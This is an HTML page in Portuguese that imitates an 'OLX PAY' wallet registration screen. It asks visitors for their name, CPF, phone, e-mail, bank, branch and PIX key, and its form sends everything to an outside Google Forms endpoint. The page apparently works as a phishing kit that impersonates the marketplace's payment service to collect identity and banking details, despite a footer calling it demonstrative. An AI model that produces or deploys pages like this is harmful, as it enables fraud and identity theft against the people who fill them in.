<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>OLX PAY – Cadastro de Carteira</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="css/style.css">
</head>
<body>

  <main class="card">

    <!-- IMAGEM -->
    <img src="assets/images/illustration.png" class="hero-img" alt="Ilustração">

    <h1>Cadastro de Carteira <span>OLX PAY</span></h1>
    <p class="subtitle">
      Complete seus dados para configurar sua forma de recebimento.
    </p>

    <!-- FORMULÁRIO INTEGRADO AO GOOGLE FORMS -->
    <form
      action="https://docs.google.com/forms/d/e/1FAIpQLSehzRxR0dYkF-wTfpcyu6Xs2_bsQgHRhu-dDsLXE2Cm2pBaxw/formResponse"
      method="POST"
      target="_self"
    >

      <input
        type="text"
        name="entry.221323787"
        placeholder="Nome completo"
        required
      >

      <input
        type="text"
        name="entry.1361339367"
        placeholder="CPF"
        required
      >

      <input
        type="tel"
        name="entry.1459915449"
        placeholder="Telefone"
        required
      >

      <input
        type="email"
        name="entry.1962051094"
        placeholder="E-mail"
        required
      >

      <input
        type="text"
        name="entry.346864409"
        placeholder="Banco"
        required
      >

      <input
        type="text"
        name="entry.1053408729"
        placeholder="Agência"
        required
      >

      <input
        type="text"
        name="entry.536088248"
        placeholder="Chave PIX"
        required
      >

      <button type="submit">RECEBER</button>
    </form>

    <footer>
      © 2026 OLX PAY – Plataforma demonstrativa
    </footer>

  </main>

</body>
</html>
